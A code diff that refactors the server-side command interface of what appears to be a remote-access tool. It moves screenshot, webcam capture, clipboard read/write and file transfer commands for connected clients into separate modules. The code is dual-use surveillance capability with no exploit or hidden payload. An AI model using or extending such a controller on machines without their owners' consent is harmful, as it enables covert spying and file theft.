@@ -10,6 +10,12 @@ from cryptography.hazmat.primitives import padding, serialization
 
 from modules.clients import Client
 from modules.baseserver import BaseServer
+
+from modules import screenshot
+from modules import webcam
+from modules import clipboard
+from modules import filetransfer
+
 from utils.prompts import increase_timeout_prompt
 
 if platform.system() != 'Windows':
@@ -25,8 +31,6 @@ socket.setdefaulttimeout(10)
 # Padding for AES
 pad = padding.PKCS7(256)
 header_length = 8
-
-BLOCK_SIZE = 32768
 
 menu_help = """
 Commands:
@@ -140,17 +144,17 @@ class ServerCLI(BaseServer):
             case 'python':
                 self.python_cli(client)
             case 'screenshot':
-                self.screenshot(client)
+                self.screenshot_cli(client)
             case 'webcam':
-                self.webcam(client)
+                self.webcam_cli(client)
             case 'copy':
-                self.copy(client)
+                self.copy_cli(client)
             case 'paste':
-                self.paste(client)
+                self.paste_cli(client)
             case 'receive':
-                self.receive_file(client)
+                self.receive_cli(client)
             case 'send':
-                self.send_file(client)
+                self.send_cli(client)
             case _:
                 print('Command was not recognized, type "help" for help.')
 
@@ -222,121 +226,64 @@ class ServerCLI(BaseServer):
             finally:
                 client.conn.settimeout(socket.getdefaulttimeout())
 
-    def screenshot(self, client: Client) -> None:
+    def screenshot_cli(self, client: Client) -> None:
         """ Take a screenshot and save it in a file """
-        logging.debug('Taking screenshot (%s)' % client.id)
-        client.write(b'SCREENSHOT')
-        client.conn.settimeout(120)
         try:
-            img_data = client.read()
-        finally:
-            client.conn.settimeout(socket.getdefaulttimeout())
-
-        if img_data.startswith(b'ERROR'):
-            logging.error('Error taking screenshot (%s): %s' % (client.id, img_data.decode()))
-            print(f'Error taking screenshot: {img_data.decode()}')
-            return
-
-        file_name = 'screenshot-' + str(datetime.now()).replace(':', '-') + '.png'
-        with open(file_name, 'wb') as file:
-            file.write(img_data)
-        logging.info('Saved screenshot at (%s): %s' % (client.id, file_name))
-        print(f'Saved screenshot: {file_name}')
-
-    def webcam(self, client: Client) -> None:
-        """ Capture webcam """
-        logging.debug('Capturing webcam (%s)' % client.id)
-        client.write(b'WEBCAM')
-        client.conn.settimeout(120)
-        try:
-            img_data = client.read()
-        finally:
-            client.conn.settimeout(socket.getdefaulttimeout())
-
-        if img_data == b'ERROR':
-            logging.error('Unable to capture webcam (%s)' % client.id)
-            print('Unable to capture webcam')
-            return
-
-        file_name = 'webcam-' + str(datetime.now()).replace(':', '-') + '.png'
-        with open(file_name, 'wb') as file:
-            file.write(img_data)
-        logging.info('Saved webcam capture at (%s): %s' % (client.id, file_name))
-        print(f'Saved webcam capture: {file_name}')
-
-    def copy(self, client: Client) -> None:
-        """ Copy to client clipboard """
-        logging.debug('Copying to client clipboard (%s)' % client.id)
-        data = input('Text to copy: ')
-        client.write(b'COPY')
-        client.write(data.encode())
-        if client.read() == b'ERROR':
-            error = client.read().decode()
-            logging.error('Error copying to client clipboard (%s): %s' % (client.id, error))
-            print(f'Error copying to client clipboard: {error}')
+            filename = screenshot.screenshot(client)
+        except RuntimeError as error:
+            print(str(error))
         else:
-            logging.info('Copied "%s" to client clipboard (%s)' % (data, client.id))
+            print(f'Saved screenshot: {filename}')
+
+    def webcam_cli(self, client: Client) -> None:
+        """ Capture webcam """
+        try:
+            filename = webcam.webcam(client)
+        except RuntimeError as error:
+            print(str(error))
+        else:
+            print(f'Saved webcam capture: {filename}')
+
+    def copy_cli(self, client: Client) -> None:
+        """ Copy to client clipboard """
+        text = input('Text to copy: ')
+        try:
+            clipboard.copy(client, text)
+        except RuntimeError as error:
+            print(str(error))
+        else:
             print('Copied to clipboard successfully')
 
-    def paste(self, client: Client) -> None:
-        """ Paste from clipboard """
-        logging.debug('Pasting from client clipboard')
-        client.write(b'PASTE')
-        clipboard = client.read().decode()
-        if clipboard == 'ERROR':
-            error = client.read().decode()
-            logging.error('Error pasting from clipboard (%s): %s' % (client.id, error))
-            print(f'Error pasting from clipboard: {error}')
+    def paste_cli(self, client: Client) -> None:
+        """ Paste from client clipboard """
+        try:
+            content = clipboard.paste(client)
+        except RuntimeError as error:
+            print(str(error))
         else:
-            logging.info('Pasted "%s" from client clipboard (%s)' % (clipboard, client.id))
-            print(f'Clipboard:\n"{clipboard}"')
+            print(f'Clipboard:\n"{content}"')
 
-    def receive_file(self, client: Client) -> None:
+    def receive_cli(self, client: Client) -> None:
         """ Receive a file from the client """
         filename = input('File to transfer: ')
         save_name = input('Save file as: ')
-        logging.debug('Receiving file "%s" from client (%s)' % (filename, client.id))
-        client.write(b'SEND_FILE')
-        client.write(filename.encode())
+        try:
+            filetransfer.receive(client, filename, save_name)
+        except RuntimeError as error:
+            print(str(error))
+        else:
+            print('File transferred successfully')
 
-        with open(save_name, 'wb') as file:
-            while True:
-                data = client.read()
-                if data == b'ERROR':
-                    logging.info('Client encountered error transferring file "%s" (%s)' % (filename, client.id))
-                    print('Client encountered error transfering file: ' + client.read().decode())
-                    break
-                if data == b'FILE_TRANSFER_DONE':
-                    break
-                file.write(data)
-
-    def send_file(self, client: Client) -> None:
+    def send_cli(self, client: Client) -> None:
         """ Send a file to client """
         filename = input('Filename: ')
         save_name = input('Save file as: ')
-        logging.debug('Sending file "%s" to client (%s)' % (filename, client.id))
-
-        client.write(b'RECEIVE_FILE')
-        client.write(save_name.encode())
-        error = client.read().decode() == 'ERROR'
-        if error:
-            print('Error occurred sending file to client: ' + client.read().decode())
-            return
-
         try:
-            with open(filename, 'rb') as file:
-                while True:
-                    block = file.read(BLOCK_SIZE)
-                    if not block:
-                        break
-                    client.write(block)
-
-        except (FileNotFoundError, PermissionError) as error:
-            logging.error('Unable to send file "%s" to client (%s): %s' % (filename, client.id, str(error)))
-            client.write(b'FILE_TRANSFER_DONE')
+            filetransfer.send(client, filename, save_name)
+        except RuntimeError as error:
+            print(str(error))
         else:
-            client.write(b'FILE_TRANSFER_DONE')
-            logging.info('Successfully transferred file "%s" to client (%s)' % (filename, client.id))
+            print('File transferred successfully')
 
 
 if __name__ == '__main__':
